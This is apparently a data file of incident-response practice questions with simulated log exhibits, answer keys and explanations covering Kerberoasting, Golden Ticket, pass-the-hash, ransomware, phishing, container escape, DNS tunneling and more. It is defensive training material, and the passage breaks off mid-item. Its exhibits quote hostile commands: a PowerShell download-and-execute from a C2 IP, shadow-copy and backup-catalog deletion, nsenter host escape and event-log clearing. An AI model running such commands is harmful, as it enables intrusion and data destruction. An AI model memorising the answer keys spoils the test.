    brief: "A security analyst reviewing Windows Security logs on DC01 notices an unusual burst of Kerberos service ticket requests. Triage the activity and choose the correct response actions.",
    exhibitTitle: "DC01 - Security Event Log (Kerberos)",
    exhibit: "<span class='dim'>04:12:01</span> <span class='ok'>EventID 4768 TGT requested user=<span class='cy'>jdoe</span> result=success</span>\n<span class='dim'>04:12:44</span> <span class='hl'>EventID 4769 TGS requested user=<span class='cy'>svc_sql</span> enctype=<span class='warnc'>0x17 (RC4-HMAC)</span> client=<span class='cy'>10.4.2.55</span></span>\n<span class='dim'>04:12:45</span> <span class='hl'>EventID 4769 TGS requested user=<span class='cy'>svc_backup</span> enctype=<span class='warnc'>0x17 (RC4-HMAC)</span> client=<span class='cy'>10.4.2.55</span></span>\n<span class='dim'>04:12:46</span> <span class='hl'>EventID 4769 TGS requested user=<span class='cy'>svc_web</span> enctype=<span class='warnc'>0x17 (RC4-HMAC)</span> client=<span class='cy'>10.4.2.55</span></span>\n<span class='dim'>04:12:47</span> <span class='hl'>EventID 4769 TGS requested user=<span class='cy'>svc_iis</span> enctype=<span class='warnc'>0x17 (RC4-HMAC)</span> client=<span class='cy'>10.4.2.55</span></span>\n<span class='dim'>04:12:49</span> <span class='hl'>EventID 4769 TGS requested user=<span class='cy'>svc_erp</span> enctype=<span class='warnc'>0x17 (RC4-HMAC)</span> client=<span class='cy'>10.4.2.55</span></span>\n<span class='dim'>04:13:02</span> <span class='dim'>Workstation 10.4.2.55 = hostname WKS-DEV-09 user jdoe</span>",
    fields: [
      {
        label: "Attack technique",
        hint: "What does a rapid burst of RC4 TGS requests for many service accounts indicate?",
        options: ["Kerberoasting (offline SPN ticket cracking)", "Password spraying against accounts", "DNS cache poisoning", "DHCP starvation"],
        answer: 0,
        explain: "Many EventID 4769 service-ticket requests for distinct service (SPN) accounts forced to weak RC4-HMAC encryption from a single host is classic Kerberoasting. The attacker requests TGS tickets to crack service-account passwords offline."
      },
      {
        label: "Severity",
        hint: "Service accounts are often privileged and reused.",
        options: ["Informational", "Low", "High", "Medium"],
        answer: 2,
        explain: "High. Cracked service-account credentials are frequently privileged and grant lateral movement or domain escalation, so this warrants urgent response."
      },
      {
        label: "First containment action",
        hint: "Cut the offending host off before tickets are exfiltrated.",
        options: ["Reboot the domain controller", "Isolate WKS-DEV-09 (10.4.2.55) from the network", "Email all users a password-reset reminder", "Disable the DC's event log"],
        answer: 1,
        explain: "Isolate the source host (WKS-DEV-09) immediately to stop further ticket harvesting while preserving evidence. Rebooting the DC or disabling logging would destroy evidence and not stop the attacker."
      },
      {
        label: "Eradication / recovery action",
        hint: "The targeted credentials are now suspect.",
        options: ["Lengthen DHCP lease times", "Rotate all targeted service-account passwords and enforce AES with long passphrases", "Re-enable RC4 for compatibility", "Delete the affected user mailboxes"],
        answer: 1,
        explain: "Rotate every targeted service-account password to long, complex values, move SPNs to AES encryption, and consider group Managed Service Accounts. This invalidates any offline-cracked credentials."
      }
    ],
    summary: "Burst RC4 TGS requests for many SPN accounts from one host = Kerberoasting. Isolate the source, then rotate service-account passwords and enforce AES."
  },
  {
    id: "PBQ-047",
    format: 2,
    domain: 4,
    title: "Golden Ticket Forged Kerberos Authentication",
    brief: "An IR team suspects a forged Kerberos TGT after a low-privilege user appears as a Domain Admin. Examine the authentication telemetry and respond.",
    exhibitTitle: "EDR + DC Auth Correlation",
    exhibit: "<span class='dim'>09:01:10</span> <span class='ok'>logon user=<span class='cy'>temp01</span> group=Domain Users host=FILE01</span>\n<span class='dim'>09:03:22</span> <span class='hl'>EventID 4624 logon user=<span class='cy'>temp01</span> presents TGT lifetime=<span class='warnc'>87600 hours (10 yrs)</span> rid=<span class='warnc'>500</span></span>\n<span class='dim'>09:03:23</span> <span class='hl'>TGT account domain SID mismatch: ticket SID=<span class='warnc'>S-1-5-21-FAKE</span> domain SID=S-1-5-21-REAL</span>\n<span class='dim'>09:03:25</span> <span class='hl'>EventID 4769 no preceding 4768 (TGT requested) for this session</span>\n<span class='dim'>09:04:40</span> <span class='hl'>temp01 accessed \\\\FILE01\\HR$ with <span class='warnc'>Domain Admin</span> rights</span>\n<span class='dim'>09:05:02</span> <span class='dim'>krbtgt last password change: 1840 days ago</span>",
    fields: [
      {
        label: "Attack technique",
        hint: "A TGT with a 10-year lifetime, RID 500, and no preceding 4768.",
        options: ["SQL injection", "Golden Ticket (forged TGT using krbtgt hash)", "Smurf attack", "Session fixation"],
        answer: 1,
        explain: "An anomalous TGT lifetime, mismatched/forged SID, RID 500 elevation, and a TGS without a preceding 4768 are signatures of a Golden Ticket, forged with the stolen krbtgt account hash."
      },
      {
        label: "Severity",
        hint: "The attacker can impersonate anyone in the domain.",
        options: ["Critical", "Low", "Medium", "Informational"],
        answer: 0,
        explain: "Critical. A Golden Ticket grants persistent, unrestricted domain-wide impersonation; the entire Active Directory trust is compromised."
      },
      {
        label: "First containment action",
        hint: "Forged tickets remain valid until the signing key changes.",
        options: ["Restart the print spooler", "Disable temp01 only", "Reset the krbtgt password twice to invalidate forged tickets", "Increase ticket lifetime"],
        answer: 2,
        explain: "Reset the krbtgt account password twice (allowing replication between resets) to invalidate every existing TGT, including the forged Golden Ticket. Disabling one user does not revoke the forged ticket."
      },
      {
        label: "Recovery action",
        hint: "krbtgt theft implies deep compromise.",
        options: ["Lower the domain functional level", "Rebuild/forensically validate domain controllers and rotate privileged credentials", "Add the attacker IP to an allowlist", "Turn off Kerberos and use NTLM"],
        answer: 1,
        explain: "Treat the domain as fully compromised: forensically validate or rebuild DCs, rotate all privileged and service credentials, and review persistence. Reverting to NTLM is weaker, not a fix."
      }
    ],
    summary: "10-year TGT, RID 500, SID mismatch, no 4768 = Golden Ticket. Reset krbtgt twice and treat the domain as compromised."
  },
  {
    id: "PBQ-048",
    format: 2,
    domain: 4,
    title: "Pass-the-Hash Lateral Movement",
    brief: "Multiple workstations show the same administrative account logging in without a password prompt. Analyze the logon telemetry and contain the spread.",
    exhibitTitle: "Windows Logon Telemetry (multi-host)",
    exhibit: "<span class='dim'>22:10:03</span> <span class='hl'>EventID 4624 user=<span class='cy'>localadmin</span> LogonType=<span class='warnc'>3 (Network)</span> AuthPkg=<span class='warnc'>NTLM</span> host=WKS-14 src=10.8.1.30</span>\n<span class='dim'>22:10:55</span> <span class='hl'>EventID 4624 user=<span class='cy'>localadmin</span> LogonType=<span class='warnc'>3 (Network)</span> AuthPkg=<span class='warnc'>NTLM</span> host=WKS-22 src=10.8.1.30</span>\n<span class='dim'>22:11:40</span> <span class='hl'>EventID 4624 user=<span class='cy'>localadmin</span> LogonType=<span class='warnc'>3 (Network)</span> AuthPkg=<span class='warnc'>NTLM</span> host=WKS-31 src=10.8.1.30</span>\n<span class='dim'>22:12:09</span> <span class='hl'>same NTLM hash, no interactive logon, no 4768/4769 Kerberos</span>\n<span class='dim'>22:12:30</span> <span class='ok'>EventID 4672 special privileges assigned to localadmin</span>\n<span class='dim'>22:13:00</span> <span class='dim'>src 10.8.1.30 = compromised host WKS-07</span>",
    fields: [
      {
        label: "Attack technique",
        hint: "Same local-admin hash reused across hosts over NTLM with no password entry.",
        options: ["Pass-the-Hash lateral movement", "Brute-force RDP", "Cross-site scripting", "Rainbow-table login at the DC"],
        answer: 0,
        explain: "Identical NTLM network logons for the same local admin across many hosts from one source, with no interactive logon or Kerberos, is Pass-the-Hash: a stolen hash is replayed to authenticate laterally."
      },
      {
        label: "Severity",
        hint: "Lateral movement is already in progress.",
        options: ["Low", "High", "Informational", "Medium"],
        answer: 1,
        explain: "High. An attacker is actively moving laterally with a privileged hash, expanding the blast radius across the estate."
      },
      {
        label: "First containment action",
        hint: "Stop the source and the credential being replayed.",
        options: ["Defragment WKS-07", "Isolate WKS-07 and disable the shared localadmin account", "Lower NTLM audit logging", "Reboot all workstations"],
        answer: 1,
        explain: "Isolate the source host (WKS-07) and disable the reused local admin account to break the replay. The shared credential is the propagation vector."
      },
      {
        label: "Eradication / recovery action",
        hint: "Shared local admin passwords enable PtH.",
        options: ["Deploy unique local admin passwords (LAPS) and restrict NTLM/network logon for admins", "Allow NTLM everywhere", "Give every user local admin", "Disable Windows Firewall"],
        answer: 0,
        explain: "Deploy LAPS so each host has a unique local admin password, restrict admin network logon, and prefer Kerberos. This removes the single reusable hash that enabled lateral movement."
      }
    ],
    summary: "Same local-admin NTLM hash replayed across hosts = Pass-the-Hash. Isolate source, disable the shared account, deploy LAPS."
  },
  {
    id: "PBQ-049",
    format: 2,
    domain: 4,
    title: "Malicious Encoded PowerShell Execution",
    brief: "An EDR alert fires on a Base64-encoded PowerShell command spawned from a Word document. Decode the intent and respond.",
    exhibitTitle: "EDR Process Telemetry - WKS-HR-04",
    exhibit: "<span class='dim'>13:40:11</span> <span class='ok'>WINWORD.EXE opened Invoice_Q2.docm</span>\n<span class='dim'>13:40:13</span> <span class='hl'>WINWORD.EXE spawned child <span class='warnc'>powershell.exe</span></span>\n<span class='dim'>13:40:13</span> <span class='hl'>cmdline: powershell -nop -w hidden -<span class='warnc'>enc</span> SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...</span>\n<span class='dim'>13:40:14</span> <span class='hl'>decoded: IEX (New-Object Net.WebClient).DownloadString('http://<span class='warnc'>185.220.101.9</span>/a.ps1')</span>\n<span class='dim'>13:40:16</span> <span class='hl'>powershell.exe established outbound TCP to <span class='warnc'>185.220.101.9:80</span></span>\n<span class='dim'>13:40:20</span> <span class='hl'>new scheduled task created: \\Microsoft\\Windows\\UpdateSync</span>\n<span class='dim'>13:40:25</span> <span class='dim'>185.220.101.9 flagged as known C2 by threat intel</span>",
    fields: [
      {
        label: "Attack vector",
        hint: "Macro document launching hidden, encoded PowerShell that downloads a payload.",
        options: ["Malicious macro dropping a PowerShell downloader/C2 stager", "Legitimate Windows Update", "Printer driver install", "Local privilege escalation via DLL only"],
        answer: 0,
        explain: "A macro-enabled document spawning hidden encoded PowerShell that calls IEX DownloadString to a known C2, then creating a persistence task, is a malicious downloader/stager."
      },
      {
        label: "Severity",
        hint: "Active C2 connection plus persistence established.",
        options: ["Informational", "Low", "High", "Medium"],
        answer: 2,
        explain: "High. The host has reached out to a confirmed C2 and established persistence, indicating active compromise rather than a benign event."
      },
      {
        label: "First containment action",
        hint: "Cut the command-and-control channel.",
        options: ["Allow the C2 IP through the firewall", "Isolate WKS-HR-04 and block 185.220.101.9 at the perimeter", "Open the document in a second app to confirm", "Reset only the user's email password"],
        answer: 1,
        explain: "Isolate the infected host and block the C2 IP/domain at the perimeter to sever command-and-control while preserving the host for forensics."
      },
      {
        label: "Eradication / recovery action",
        hint: "Persistence and dropped payload must be removed.",
        options: ["Whitelist the UpdateSync task", "Remove the malicious scheduled task and dropped payload, reimage if integrity is uncertain", "Disable EDR alerting", "Re-enable macros for all users"],
        answer: 1,
        explain: "Delete the persistence (UpdateSync task) and dropped scripts, hunt for additional artifacts, and reimage if integrity cannot be assured. Disable macros from the internet by policy going forward."
      }
    ],
    summary: "docm to hidden -enc PowerShell to C2 download to scheduled task = macro downloader. Isolate, block C2, remove persistence."
  },
  {
    id: "PBQ-050",
    format: 2,
    domain: 4,
    title: "Ransomware Mass File Encryption",
    brief: "A file server alerts on a flood of file renames followed by shadow-copy deletion. Determine the incident type and the correct first moves.",
    exhibitTitle: "FILE-SRV-02 - File Audit + Process Log",
    exhibit: "<span class='dim'>02:14:09</span> <span class='hl'>10,482 files renamed to extension <span class='warnc'>.locked</span> in 90 seconds under \\\\FILE-SRV-02\\Shares</span>\n<span class='dim'>02:14:30</span> <span class='hl'>process <span class='warnc'>svchost32.exe</span> writing README_RESTORE.txt to every folder</span>\n<span class='dim'>02:14:41</span> <span class='hl'>cmd: <span class='warnc'>vssadmin.exe delete shadows /all /quiet</span></span>\n<span class='dim'>02:14:42</span> <span class='hl'>cmd: <span class='warnc'>wbadmin delete catalog -quiet</span></span>\n<span class='dim'>02:14:50</span> <span class='hl'>cmd: bcdedit /set recoveryenabled No</span>\n<span class='dim'>02:15:05</span> <span class='dim'>source SMB session from 10.10.5.66 (WKS-FIN-11)</span>",
    fields: [
      {
        label: "Incident type",
        hint: "Mass rename + ransom note + shadow-copy deletion.",
        options: ["Ransomware encryption with anti-recovery", "Disk defragmentation", "Routine backup rotation", "Database index rebuild"],
        answer: 0,
        explain: "Rapid mass renaming to a uniform extension, ransom notes in every folder, and deletion of shadow copies and backup catalogs are unmistakable ransomware behaviors designed to block recovery."
      },
      {
        label: "Severity",
        hint: "Recovery options are actively being destroyed.",
        options: ["Low", "Medium", "Critical", "Informational"],
        answer: 2,
        explain: "Critical. Production data is being encrypted and recovery mechanisms deleted in real time, threatening business continuity."
      },
      {
        label: "First containment action",
        hint: "Stop the spread and the encryptor.",
        options: ["Pay the ransom immediately", "Isolate FILE-SRV-02 and the source WKS-FIN-11 from the network", "Reboot the server to clear memory", "Delete the README files"],
        answer: 1,
        explain: "Isolate both the file server and the source workstation to halt encryption and lateral spread. Rebooting can destroy in-memory keys/evidence and paying is not a containment action."
      },
      {
        label: "Recovery action",
        hint: "Shadow copies are gone.",
        options: ["Restore from known-good offline/immutable backups after eradication", "Restore from the deleted shadow copies", "Decrypt by guessing the key", "Re-share the encrypted files"],
        answer: 0,
        explain: "After eradicating the malware and validating clean systems, restore from offline or immutable backups. On-host shadow copies were intentionally deleted and are unavailable."
      }
    ],
    summary: "Mass .locked rename + ransom note + vssadmin delete = ransomware. Isolate server and source, restore from offline backups."
  },
  {
    id: "PBQ-051",
    format: 2,
    domain: 4,
    title: "Phishing Link Click and Credential Harvest",
    brief: "A proxy and web log show a user clicking a phishing URL and POSTing credentials to an external site. Triage the credential-theft incident.",
    exhibitTitle: "Web Proxy Log - user msmith",
    exhibit: "<span class='dim'>10:02:11</span> <span class='ok'>GET https://mail.corp.example.com/inbox 200</span>\n<span class='dim'>10:03:45</span> <span class='hl'>GET <span class='warnc'>http://office365-login-verify.ru/auth</span> referer=mail-link 200</span>\n<span class='dim'>10:03:46</span> <span class='hl'>page served clone of \"Microsoft Sign In\" (favicon mismatch)</span>\n<span class='dim'>10:04:10</span> <span class='hl'>POST <span class='warnc'>http://office365-login-verify.ru/auth</span> body=\"user=msmith&pass=*****\" 302</span>\n<span class='dim'>10:04:12</span> <span class='hl'>redirect to https://login.microsoftonline.com (to allay suspicion)</span>\n<span class='dim'>10:09:30</span> <span class='warnc'>new sign-in for msmith from 91.214.0.7 (RU) - impossible travel</span>",
    fields: [
      {
        label: "Attack vector",
        hint: "User submitted credentials to a spoofed login page.",
        options: ["Credential phishing via spoofed login page", "SQL injection on the mail server", "ARP spoofing on the LAN", "Buffer overflow in the browser"],
        answer: 0,
        explain: "A look-alike domain hosting a cloned Microsoft sign-in page, a credential POST, and a follow-on foreign sign-in indicate credential phishing and successful account compromise."
      },
      {
        label: "Severity",
        hint: "Credentials were submitted and reused from abroad.",
        options: ["Informational", "High", "Low", "Medium"],
        answer: 1,
        explain: "High. The credentials were captured and already used in an impossible-travel sign-in, so the account is actively compromised."
      },
      {
        label: "First containment action",
        hint: "Kill the attacker's access to the account.",
        options: ["Tell the user to ignore future emails", "Reset msmith's password and revoke active sessions/tokens", "Block all outbound HTTP", "Re-image the mail server"],
        answer: 1,
        explain: "Immediately reset the password and revoke active sessions/refresh tokens to evict the attacker, then enforce MFA. The compromised account is the priority."
      },
      {
        label: "Eradication / recovery action",
        hint: "Prevent others from reaching the same trap.",
        options: ["Allow the .ru domain for testing", "Block/sinkhole the phishing domain, purge the email, and check for inbox rules/forwarding", "Disable the proxy logging", "Lower password complexity"],
        answer: 1,
        explain: "Block the phishing domain, remove the message from all mailboxes, and inspect the account for malicious mailbox rules or forwarding the attacker may have added."
      }
    ],
    summary: "Click to cloned login to credential POST to foreign sign-in = phishing compromise. Reset password, revoke sessions, block the domain."
  },
  {
    id: "PBQ-052",
    format: 2,
    domain: 4,
    title: "Insider Data Staging Before Exfiltration",
    brief: "DLP and file-access logs show an employee under notice collecting sensitive files into an archive. Assess the insider-threat indicators.",
    exhibitTitle: "DLP + File Access Log - user kparker",
    exhibit: "<span class='dim'>17:50:02</span> <span class='ok'>kparker accessed \\\\FS\\Sales\\Pipeline.xlsx (normal hours pattern shifted)</span>\n<span class='dim'>18:31:14</span> <span class='hl'>kparker read <span class='warnc'>4,210 files</span> across Sales, R&D, Finance in 25 min</span>\n<span class='dim'>18:55:40</span> <span class='hl'>files copied to <span class='warnc'>C:\\Users\\kparker\\Temp\\export.7z</span> (2.3 GB)</span>\n<span class='dim'>19:02:09</span> <span class='hl'>USB mass storage device inserted: <span class='warnc'>SanDisk 64GB</span></span>\n<span class='dim'>19:03:50</span> <span class='hl'>DLP: attempted copy of export.7z to <span class='warnc'>removable drive E:</span> - blocked</span>\n<span class='dim'>19:05:00</span> <span class='dim'>HR note: kparker resignation effective in 3 days</span>",
    fields: [
      {
        label: "Incident type",
        hint: "Bulk collection into an archive plus USB plus pending departure.",
        options: ["Insider data staging/exfiltration attempt", "Automated nightly backup", "Software update deployment", "Antivirus full scan"],
        answer: 0,
        explain: "A departing employee mass-reading cross-department files, compressing them, and attempting USB transfer is insider data staging ahead of exfiltration."
      },
      {
        label: "Severity",
        hint: "Sensitive IP across multiple departments is involved.",
        options: ["Low", "High", "Informational", "Medium"],
        answer: 1,
        explain: "High. Aggregation of sensitive R&D, Sales, and Finance data by a soon-to-depart insider is a serious data-loss and IP-theft risk."
      },
      {
        label: "First containment action",
        hint: "Limit the insider's reach while preserving evidence.",
        options: ["Delete the export.7z file immediately", "Suspend kparker's access and preserve the host/USB for forensics", "Wait until the resignation date", "Let HR send a reminder email"],
        answer: 1,
        explain: "Suspend the user's access and preserve the workstation and any removable media for forensic review and legal hold. Deleting files destroys evidence."
      },
      {
        label: "Recovery / follow-up action",
        hint: "Reduce future exposure and coordinate.",
        options: ["Give kparker more access for the transition", "Engage HR/Legal, review DLP coverage, and tighten access for leavers", "Disable DLP to avoid false positives", "Re-enable USB write access broadly"],
        answer: 1,
        explain: "Coordinate with HR and Legal, confirm DLP/USB controls work as intended, and enforce least-privilege and offboarding procedures for departing staff."
      }
    ],
    summary: "Departing user mass-collecting files to archive + USB = insider staging. Suspend access, preserve evidence, involve HR/Legal."
  },
  {
    id: "PBQ-053",
    format: 2,
    domain: 4,
    title: "Cloud IAM Access Key Abuse and Impossible Travel",
    brief: "CloudTrail shows a long-unused access key suddenly active from two countries minutes apart, enumerating and exfiltrating from S3. Respond to the IAM compromise.",
    exhibitTitle: "AWS CloudTrail - AccessKey AKIA...7Q",
    exhibit: "<span class='dim'>03:11:02</span> <span class='hl'>GetCallerIdentity srcIP=<span class='warnc'>203.0.113.50 (NL)</span> key=AKIA...7Q (last used 214 days ago)</span>\n<span class='dim'>03:12:40</span> <span class='hl'>ListBuckets srcIP=<span class='warnc'>198.51.100.20 (SG)</span> - impossible travel</span>\n<span class='dim'>03:13:05</span> <span class='hl'>CreateUser name=<span class='warnc'>svc-helper</span>; AttachUserPolicy <span class='warnc'>AdministratorAccess</span></span>\n<span class='dim'>03:14:22</span> <span class='hl'>GetObject x2,940 from s3://corp-pii-prod/ srcIP=198.51.100.20</span>\n<span class='dim'>03:15:00</span> <span class='hl'>PutBucketPolicy made s3://corp-pii-prod/ <span class='warnc'>public-read</span></span>\n<span class='dim'>03:16:10</span> <span class='ok'>CloudTrail still logging (not yet disabled)</span>",
    fields: [
      {
        label: "Attack vector",
        hint: "A dormant key reactivated from two regions, creating an admin user.",
        options: ["Compromised IAM access key with privilege escalation and S3 exfiltration", "Misconfigured load balancer", "Expired TLS certificate", "Cross-region replication lag"],
        answer: 0,
        explain: "A leaked/compromised access key reused with impossible travel, creating an admin user, downloading PII, and making a bucket public is IAM key abuse with escalation and data exfiltration."
      },
      {
        label: "Severity",
        hint: "PII is being exfiltrated and exposed publicly.",
        options: ["Informational", "Low", "Critical", "Medium"],
        answer: 2,
        explain: "Critical. Mass PII download plus a bucket set to public-read constitutes an active, large-scale data breach."
      },
      {
        label: "First containment action",
        hint: "Revoke the attacker's credentials and any they created.",
        options: ["Rotate the S3 bucket name", "Deactivate/delete the compromised key and the rogue svc-helper user", "Email the account owner and wait", "Enable versioning on the bucket"],
        answer: 1,
        explain: "Immediately disable/delete the compromised access key and remove the attacker-created svc-helper admin user to cut off access, then revert the public bucket policy."
      },
      {
        label: "Recovery / hardening action",
        hint: "Prevent recurrence and confirm scope.",
        options: ["Make all buckets public to simplify access", "Enforce MFA, rotate keys, apply least-privilege, and alert on impossible travel/key reuse", "Disable CloudTrail to reduce noise", "Share the root credentials with the team"],
        answer: 1,
        explain: "Rotate keys, enforce MFA and least-privilege, add detection for dormant-key reuse and impossible travel, and assess the breach scope for notification obligations."
      }
    ],
    summary: "Dormant key + impossible travel + admin-user creation + S3 PII pull = IAM key abuse. Disable key/rogue user, revert public policy, harden IAM."
  },
  {
    id: "PBQ-054",
    format: 2,
    domain: 4,
    title: "Container Escape to the Host",
    brief: "Runtime security alerts show a container process breaking out to the underlying node. Analyze the escape and contain the node.",
    exhibitTitle: "Container Runtime Security - pod web-7f9",
    exhibit: "<span class='dim'>15:20:01</span> <span class='ok'>container web-7f9 running image nginx:1.21</span>\n<span class='dim'>15:21:33</span> <span class='hl'>container started with <span class='warnc'>--privileged</span> and host mount <span class='warnc'>/:/host</span></span>\n<span class='dim'>15:22:10</span> <span class='hl'>process inside container: <span class='warnc'>nsenter --target 1 --mount --net /bin/bash</span></span>\n<span class='dim'>15:22:12</span> <span class='hl'>write to <span class='warnc'>/host/etc/cron.d/backdoor</span> from container UID 0</span>\n<span class='dim'>15:22:40</span> <span class='hl'>node process list now includes containerd child shell on host PID namespace</span>\n<span class='dim'>15:23:05</span> <span class='dim'>node: k8s-node-04, cluster prod-east</span>",
    fields: [
      {
        label: "Attack technique",
        hint: "Privileged container + host mount + nsenter into PID 1.",
        options: ["Container escape / breakout to the host node", "Cross-site request forgery", "VLAN hopping", "Email spoofing"],
        answer: 0,
        explain: "A privileged container with a host root mount using nsenter to enter the host namespaces and write a cron backdoor is a container escape (breakout) to the underlying node."
      },
      {
        label: "Severity",
        hint: "The host node and potentially the cluster are compromised.",
        options: ["Low", "Critical", "Informational", "Medium"],
        answer: 1,
        explain: "Critical. Host compromise from a container can expose the node's credentials and pivot across the cluster, undermining all workloads on it."
      },
      {
        label: "First containment action",
        hint: "Stop the workload and remove the node from scheduling.",
        options: ["Scale the deployment up", "Cordon/drain and isolate k8s-node-04 and kill the offending pod", "Restart the container with more memory", "Expose the pod via a public LoadBalancer"],
        answer: 1,
        explain: "Cordon and isolate the affected node, then kill the malicious pod to stop further host activity while preserving the node for forensics."
      },
      {
        label: "Eradication / hardening action",
        hint: "Remove persistence and prevent privileged pods.",
        options: ["Remove the cron backdoor, rebuild the node, and enforce Pod Security (no privileged/host mounts)", "Allow privileged containers globally", "Disable the runtime security tool", "Give the container CAP_SYS_ADMIN"],
        answer: 0,
        explain: "Delete the host cron backdoor, rebuild/replace the node, rotate node credentials, and enforce Pod Security Standards to block privileged containers and host mounts."
      }
    ],
    summary: "Privileged pod + host mount + nsenter + host cron write = container escape. Cordon/isolate the node, remove persistence, enforce Pod Security."
  },
  {
    id: "PBQ-055",
    format: 2,
    domain: 4,
    title: "ARP Spoofing On-Path Interception",
    brief: "Network monitoring detects a host claiming to be the default gateway. Identify the on-path attack and contain it.",
    exhibitTitle: "Switch / ARP Monitor - VLAN 20",
    exhibit: "<span class='dim'>11:00:05</span> <span class='ok'>gateway 10.20.0.1 = MAC aa:bb:cc:00:00:01 (router)</span>\n<span class='dim'>11:02:18</span> <span class='hl'>ARP reply: 10.20.0.1 is-at <span class='warnc'>de:ad:be:ef:12:34</span> (host 10.20.0.88)</span>\n<span class='dim'>11:02:19</span> <span class='hl'>gratuitous ARP storm: 10.20.0.1 claimed by <span class='warnc'>de:ad:be:ef:12:34</span> x300/min</span>\n<span class='dim'>11:02:40</span> <span class='hl'>clients updated ARP cache: gateway now points to 10.20.0.88</span>\n<span class='dim'>11:03:10</span> <span class='hl'>10.20.0.88 IP forwarding enabled; sees plaintext HTTP + LDAP traffic</span>\n<span class='dim'>11:03:55</span> <span class='dim'>port Gi1/0/12 = host WKS-GUEST-02</span>",
    fields: [
      {
        label: "Attack technique",
        hint: "A host forging ARP replies to impersonate the gateway.",
        options: ["ARP spoofing / on-path (MITM) interception", "Ransomware", "DNS tunneling", "Password spraying"],
        answer: 0,
        explain: "A host sending gratuitous ARP replies claiming the gateway's IP, poisoning client caches, and enabling forwarding to read traffic is ARP spoofing used for an on-path (man-in-the-middle) attack."
      },
      {
        label: "Severity",
        hint: "Plaintext credentials traverse the attacker.",
        options: ["Informational", "Low", "High", "Medium"],
        answer: 2,
        explain: "High. The attacker intercepts traffic for an entire VLAN, including plaintext HTTP and LDAP that may carry credentials."
      },
      {
        label: "First containment action",
        hint: "Cut the malicious host off at its switch port.",
        options: ["Reboot the router", "Disable switch port Gi1/0/12 and quarantine 10.20.0.88", "Increase the DHCP scope", "Clear ARP on the router only"],
        answer: 1,
        explain: "Shut down the attacker's switch port to remove it from the segment, then quarantine the host for investigation. Clearing ARP alone would be re-poisoned immediately."
      },
      {
        label: "Eradication / hardening action",
        hint: "Prevent forged ARP and protect traffic.",
        options: ["Enable Dynamic ARP Inspection/DHCP snooping and enforce encryption (HTTPS/LDAPS)", "Switch the VLAN to a hub", "Disable port security", "Allow gratuitous ARP from any host"],
        answer: 0,
        explain: "Enable DHCP snooping and Dynamic ARP Inspection to block forged ARP, and require encrypted protocols (HTTPS/LDAPS) so intercepted traffic is useless."
      }
    ],
    summary: "Gratuitous ARP claiming the gateway + IP forwarding = ARP spoofing MITM. Disable the port, then enable DAI and encrypt traffic."
  },
  {
    id: "PBQ-056",
    format: 2,
    domain: 4,
    title: "Event Log Cleared - Anti-Forensics",
    brief: "A SIEM gap and a tell-tale event indicate an attacker wiped logs to hide activity. Recognize the log-tampering and respond.",
    exhibitTitle: "DC02 - Security / System Log (around the gap)",
    exhibit: "<span class='dim'>23:58:40</span> <span class='ok'>EventID 4624 admin logon user=svc_audit host=DC02</span>\n<span class='dim'>23:59:05</span> <span class='hl'>EventID <span class='warnc'>1102</span> The audit log was cleared by user=<span class='cy'>svc_audit</span></span>\n<span class='dim'>23:59:06</span> <span class='hl'>cmd observed earlier: <span class='warnc'>wevtutil cl Security</span> &amp; <span class='warnc'>wevtutil cl System</span></span>\n<span class='dim'>23:59:10</span> <span class='warnc'>SIEM ingestion gap from DC02: 22:10 to 23:58 (no events forwarded)</span>\n<span class='dim'>00:01:30</span> <span class='hl'>EventID <span class='warnc'>104</span> System log cleared</span>\n<span class='dim'>00:02:00</span> <span class='dim'>svc_audit is not an interactive admin account by policy</span>",
    fields: [
      {
        label: "Attack technique",
        hint: "EventID 1102/104 plus wevtutil cl and a SIEM gap.",
        options: ["Log tampering / anti-forensics (cleared event logs)", "Time synchronization error", "Disk full causing log rotation", "Legitimate scheduled maintenance"],
        answer: 0,
        explain: "EventID 1102 (Security log cleared) and 104 (System log cleared), wevtutil cl commands, and a forwarding gap are anti-forensic log tampering meant to erase the attacker's trail."
      },
      {
        label: "Severity",
        hint: "Logs are deliberately destroyed on a DC.",
        options: ["Informational", "High", "Low", "Medium"],
        answer: 1,
        explain: "High. Deliberate clearing of security logs on a domain controller indicates an active intrusion attempting to evade detection and destroy evidence."
      },
      {
        label: "First containment action",
        hint: "Preserve what's left and limit the abused account.",
        options: ["Clear the remaining logs to start fresh", "Isolate DC02, disable svc_audit, and preserve memory/disk for forensics", "Lower the log retention to save space", "Reboot DC02 to regenerate logs"],
        answer: 1,
        explain: "Isolate the DC, disable the abused svc_audit account, and capture volatile data and disk images. Rely on previously forwarded SIEM data since local logs were wiped."
      },
      {
        label: "Eradication / hardening action",
        hint: "Make future tampering harder to hide.",
        options: ["Forward logs off-host in real time, restrict who can clear logs, and alert on 1102/104", "Stop forwarding logs to the SIEM", "Grant all admins log-clear rights", "Disable event logging entirely"],
        answer: 0,
        explain: "Ensure real-time off-host log forwarding (so cleared local logs still exist centrally), restrict the Manage auditing/security log right, and alert on EventID 1102/104."
      }
    ],
    summary: "EventID 1102/104 + wevtutil cl + SIEM gap = log tampering. Isolate the DC, disable the account, and forward logs off-host with clear-events alerting."
  },
  {
    id: "PBQ-057",
    format: 2,
    domain: 4,
    title: "DNS Tunneling Data Exfiltration",
    brief: "A DNS resolver log shows a flood of long, high-entropy subdomain queries to one domain. Identify the covert channel and contain it.",
    exhibitTitle: "Internal DNS Resolver Log - host WKS-ENG-08",
    exhibit: "<span class='dim'>06:30:01</span> <span class='ok'>A query www.example.com from 10.6.3.8</span>\n<span class='dim'>06:30:14</span> <span class='hl'>TXT query <span class='warnc'>kJ2x9aQ.f1d.exfil-data.bad.tld</span> from 10.6.3.8</span>\n<span class='dim'>06:30:14</span> <span class='hl'>TXT query <span class='warnc'>p7Lm0bV.f2d.exfil-data.bad.tld</span> from 10.6.3.8</span>\n<span class='dim'>06:30:15</span> <span class='hl'>TXT query <span class='warnc'>q9Rt3cN.f3d.exfil-data.bad.tld</span> from 10.6.3.8</span>\n<span class='dim'>06:30:15</span> <span class='hl'>~<span class='warnc'>900 queries/min</span> to *.exfil-data.bad.tld, avg label len 31</span>\n<span class='dim'>06:31:00</span> <span class='dim'>bad.tld authoritative NS = 45.77.0.3 (newly registered)</span>",
    fields: [
      {
        label: "Attack technique",
        hint: "High-volume, high-entropy TXT subdomains to one external domain.",
        options: ["DNS tunneling for covert exfiltration/C2", "NTP amplification", "Clickjacking", "SQL injection"],
        answer: 0,
        explain: "A flood of long, random-looking TXT subdomain queries to a single newly registered domain is DNS tunneling, encoding stolen data (or C2) inside DNS to bypass egress controls."
      },
      {
